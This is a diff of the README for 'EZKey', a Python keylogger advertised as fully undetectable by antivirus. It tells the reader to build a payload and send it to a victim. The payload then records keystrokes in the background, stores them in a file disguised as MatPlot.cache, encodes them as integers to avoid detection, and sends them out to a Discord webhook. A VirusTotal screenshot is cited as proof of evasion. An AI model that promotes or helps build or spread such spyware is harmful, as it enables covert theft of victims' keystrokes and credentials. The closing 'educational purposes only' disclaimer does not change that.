@@ -13,23 +13,23 @@
     <h2>
         POC | FUD KeyLogger made with Python 
     </h2>
-    <strong><a href="https://discord.gg/BptVd57QHr">Discord</a> | by <a href="https://github.com/xpierroz">pierro</a></strong>
+    <strong>by <a href="https://github.com/xpierroz">pierro</a></strong>
+    <br>
 </div>
 
-### <p align="center">Introduction</p>
+### Introduction
 
 EZKey is a POC made to demonstrate how a simple Python program is able to steal the keyboard activity from someone while passing most of the antivirus protections. 
 
-### <p align="center">Features</p>
+### Features
 
 - EZKey is FUD (fully undetectable)
 - EZKey encrypts the data to int
 - EZKey sends the data to your Discord Webhook
 - EZKey is easy to use
 
-<br>
 
-### <p align="center">How to use</p>
+### How to use<
 
 - Download this repository and extract it.
 - Start client.py and create the payload
@@ -37,19 +37,17 @@ EZKey is a POC made to demonstrate how a simple Python program is able to steal 
 - Edit the payload's name, and compile it (not necessary)
 - Send the payload to your victim
 
-<br>
 
-### <p align="center">How does it work</p>
+### How does it work
 
 Once the victim executes the payload, it will start the keylogger in the background. Every keys will be recorded and saved to MatPlot.cache. Everytime the maxlen var (chosed by the user when creating the payload) is reached, the keylogger will send a file containing the data to the webhook. The data will be encrypted to integers, so it will be harder to detect it.
 
-<br>
 
-### <p align="center">Virus Total analyze</p>
+### Virus Total analyze
 
 ![VirusTotal](assets/virustotal.png)
 
-### <p align="center">Warning</p>
+### Warning
 
 This program is made explicity for educational & research purposes only.
 Do not use for malicious purposes.
